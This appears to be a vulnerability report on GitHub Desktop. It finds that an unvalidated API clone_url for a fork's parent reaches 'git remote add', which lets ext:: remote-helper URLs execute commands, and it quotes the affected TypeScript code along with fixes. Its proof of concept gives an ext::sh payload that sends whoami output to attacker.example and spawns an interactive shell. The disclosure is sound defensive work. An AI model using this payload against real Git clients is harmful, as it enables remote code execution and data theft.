### Title
Fork "upstream" remote is set from an unvalidated API `clone_url`, allowing an `ext::`/`fd::` remote-helper payload to reach `git remote add`/`set-url` and later `git fetch` — ([File: app/src/lib/stores/git-store.ts])

### Summary
GitHub Desktop trusts the `clone_url` field of a fork's parent repository — data returned by the GitHub API (or a GitHub Enterprise Server / MITM proxy standing in for it) — and passes it unvalidated into `git remote add`/`git remote set-url` to configure the `upstream` remote. There is no scheme allow-list (no `GIT_ALLOW_PROTOCOL`, no rejection of `ext::`, `fd::`, `file://`, etc.) anywhere in the remote-handling code, so a malicious/compromised API response can smuggle a Git "remote helper" URL into the local repository configuration. Any subsequent fetch of that remote executes the attacker-supplied command.

### Finding Description
When Desktop determines that a repository is a fork, it reads `gitHubRepository.parent` (populated straight from the API's `IAPIFullRepository.parent` object, see `parent.cloneURL` in `app/src/lib/stores/repositories-store.ts:596-681` and `app/src/models/github-repository.ts:1-59`) and uses `parent.cloneURL` verbatim as the URL for the `upstream` remote: [1](#0-0) [2](#0-1) [3](#0-2) 

These all funnel into `addRemote` / `setRemoteURL`, which build the raw `git remote add name url` / `git remote set-url name url` command line with no scheme or content validation whatsoever: [4](#0-3) [5](#0-4) 

Contrast this with `parseRemote`/`sanitizeCloneName` in `app/src/lib/remote-parsing.ts`, which are used to validate/sanitize *user-typed* clone URLs (owner/name/hostname extraction, path-traversal-safe directory names) — but that validation path is never applied to the fork "parent" URL that comes from the API object. The broken invariant is the same class as the reported "missing required-field enforcement": the code assumes `clone_url` is always a well-formed `https://` or `git@` URL because that's what github.com normally returns, but nothing enforces or checks that assumption before the value is handed to `git remote`.

Git natively supports "remote helper" URL schemes such as `ext::<command>` and `fd::<fd>` (and, on older/afflicted Git versions, `ssh://-oProxyCommand=...` style argument-injection payloads). If the `clone_url` string is instead something like `ext::sh -c touch$IFS/tmp/pwned` (or a Windows equivalent invoking `cmd.exe`), `git remote add upstream <payload>` will happily store it, and the next `git fetch upstream` (or `git fetch --all`, background fetch, or the "Fetch origin"/pull-request lookup flows) will hand it to Git's transport layer, which for `ext::` directly executes the given shell command.

No existing guard stops this:
- `envForRemoteOperation`/`envForProxy` only deal with proxy resolution, not protocol allow-listing (`app/src/lib/git/environment.ts`).
- There is no `GIT_ALLOW_PROTOCOL`/`protocol.allow` configuration set anywhere in the codebase (confirmed absent via search).
- `findUpstreamRemote`/`repositoryMatchesRemote` only compare URLs for equality to decide whether to show the "Upstream Already Exists" dialog — they do not validate the *scheme* of `parent.cloneURL` before it's ever written with `addRemote`.
- `forceUnwrap('Parent repositories are fully loaded', parent.cloneURL)` (`git-store.ts:1347-1350`, `:1687-1690`) only asserts non-null, not well-formedness.

### Impact Explanation
Successful exploitation yields arbitrary local command execution on the victim's machine as soon as Desktop (or the user) fetches/updates the `upstream` remote — this is triggered automatically by Desktop's own fork-upstream bookkeeping (`addUpstreamRemoteIfNeeded`, `updateExistingUpstreamRemote`, `_convertRepositoryToFork`) and by routine background/foreground fetches. This satisfies the "attacker controls a GitHub API object / git remote / proxy response, resulting in code execution" criteria explicitly listed as valid impact. Because a forked repository's parent metadata is attacker-influenceable on GitHub Enterprise Server deployments (server admin, compromised GHES instance) and trivially attacker-controlled when intercepted by a MITM/corporate proxy (a scenario this codebase explicitly designs around — see `docs/technical/proxies.md`), this is a realistic vector for a non-dotcom-only Desktop threat model.

### Likelihood Explanation
Requires the victim to open/fork a repository whose GitHub API responses (from a GHES instance or a machine-in-the-middle proxy) contain a malicious `parent.clone_url`. It does not require local access, admin rights, prior malware, or unnatural user steps — normal Desktop usage (cloning a fork, or Desktop auto-detecting "this repo is a fork of X") triggers the vulnerable code path and a subsequent ordinary fetch triggers execution. Likelihood is moderate: it depends on control over API responses served to the victim's Desktop instance, which is plausible in enterprise/GHES or intercepting-proxy environments but not on stock github.com traffic over TLS without an MITM foothold.

### Recommendation
Before calling `addRemote`/`setRemoteURL` with any API-derived URL (`parent.cloneURL` or similar), validate that the URL uses one of the expected, safe schemes (`https:`, `http:`, `ssh:`, `git:`, or the scp-like `user@host:path` form already recognized by `parseRemote`) and reject anything else (in particular `ext::`, `fd::`, and any string not matching the `remoteRegexes` patterns in `app/src/lib/remote-parsing.ts`). Additionally, set `GIT_ALLOW_PROTOCOL` (or `-c protocol.ext.allow=never` / `protocol.allow=never` with an explicit allow-list) in `envForRemoteOperation`/`withTrampolineEnv` for all Git invocations as defense-in-depth, mirroring the way `envForAuthentication` already hardens the Git environment.

### Proof of Concept
1. Stand up (or MITM) a GitHub Enterprise Server–style API endpoint that Desktop is configured to use.
2. When Desktop requests repository info for a fork (e.g., via `fetchRepositoryCloneInfo` / the repo endpoint that populates `IAPIFullRepository.parent`), return a `parent` object whose `clone_url` is:
   ```
   ext::sh -c "curl attacker.example/$(whoami) >/tmp/x; sh -i"
   ```
3. Open the fork in Desktop; `addUpstreamRemoteIfNeeded` (`git-store.ts:1321`) calls `addRemote(repository, 'upstream', parent.cloneURL)`, which runs `git remote add upstream ext::sh -c "..."` (`app/src/lib/git/remote.ts:34`) — Git happily stores this as the `upstream` remote URL, no error.
4. Any fetch of `upstream` (user-initiated "Fetch" or Desktop's background fetch cycle, or the "Update from default branch" workflow) invokes `git fetch upstream`, causing Git to invoke the `ext::` remote helper, which executes the attacker's shell command in the context of the Desktop user.

### Citations

**File:** app/src/lib/stores/git-store.ts (L1321-1356)
```typescript
  public async addUpstreamRemoteIfNeeded(): Promise<void> {
    const parent =
      this.repository.gitHubRepository &&
      this.repository.gitHubRepository.parent
    if (!parent) {
      return
    }

    const remotes = await getRemotes(this.repository)
    const upstream = findUpstreamRemote(parent, remotes)
    if (upstream) {
      return
    }

    const remoteWithUpstreamName = remotes.find(
      r => r.name === UpstreamRemoteName
    )
    if (remoteWithUpstreamName) {
      const error = new UpstreamAlreadyExistsError(
        this.repository,
        remoteWithUpstreamName
      )
      this.emitError(error)
      return
    }

    const url = forceUnwrap(
      'Parent repositories are fully loaded',
      parent.cloneURL
    )

    this._upstreamRemote =
      (await this.performFailableOperation(() =>
        addRemote(this.repository, UpstreamRemoteName, url)
      )) ?? null
  }
```

**File:** app/src/lib/stores/git-store.ts (L1364-1380)
```typescript
  public async ensureUpstreamRemoteURL(remoteUrl: string): Promise<void> {
    await this.performFailableOperation(async () => {
      try {
        await addRemote(this.repository, UpstreamRemoteName, remoteUrl)
      } catch (e) {
        if (
          e instanceof DugiteError &&
          e.result.gitError === GitError.RemoteAlreadyExists
        ) {
          // update upstream remote if it already exists
          await setRemoteURL(this.repository, UpstreamRemoteName, remoteUrl)
        } else {
          throw e
        }
      }
    })
  }
```

**File:** app/src/lib/stores/git-store.ts (L1674-1695)
```typescript
  /**
   * Update the repository's existing upstream remote to point to the parent
   * repository.
   */
  public async updateExistingUpstreamRemote(): Promise<void> {
    const gitHubRepository = forceUnwrap(
      'To update an upstream remote, the repository must be a GitHub repository',
      this.repository.gitHubRepository
    )
    const parent = forceUnwrap(
      'To update an upstream remote, the repository must have a parent',
      gitHubRepository.parent
    )
    const url = forceUnwrap(
      'Parent repositories are always fully loaded',
      parent.cloneURL
    )

    await this.performFailableOperation(() =>
      setRemoteURL(this.repository, UpstreamRemoteName, url)
    )
  }
```

**File:** app/src/lib/git/remote.ts (L28-37)
```typescript
/** Add a new remote with the given URL. */
export async function addRemote(
  repository: Repository,
  name: string,
  url: string
): Promise<IRemote> {
  await git(['remote', 'add', name, url], repository.path, 'addRemote')

  return { url, name }
}
```

**File:** app/src/lib/git/remote.ts (L56-64)
```typescript
/** Changes the URL for the remote that matches the given name  */
export async function setRemoteURL(
  repository: Repository,
  name: string,
  url: string
): Promise<true> {
  await git(['remote', 'set-url', name, url], repository.path, 'setRemoteURL')
  return true
}
```
